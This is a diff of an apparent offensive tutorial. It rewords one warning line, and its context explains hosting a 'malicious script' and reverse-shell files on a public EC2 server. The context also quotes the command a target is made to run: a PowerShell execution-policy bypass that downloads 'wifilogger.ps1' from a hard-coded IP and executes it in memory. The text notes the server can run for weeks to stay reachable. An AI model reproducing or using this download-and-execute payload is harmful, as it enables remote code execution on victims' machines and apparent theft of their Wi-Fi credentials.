@@ -166,7 +166,7 @@ Finally, we can host a python server in the directory where we have our reverse 
 
 Press `CTR + B + D` to detach from the session.
 
-⚠️ Make sure you don't have an important thing in that directory before hosting public, and make sure you have your services very secure. 
+⚠️ Make sure you don't have any sensitive file in that directory before hosting public, and make sure you have your services very secure. 
 
 Now, visit your EC2 public ip address in the browser, and you should see the files being hosted in the public. So in our malicious script, the target would execute this line `'powershell -ep bypass -c "iex (iwr http://52.202.38.242/wifilogger.ps1)"'`, which visits our public ip and executes the powershell script in memory, that's why we need to host the files in public to be reachable. You can leave your server running in the cloud for days or weeks, The free tier offers 600 hours of free service I think.
 
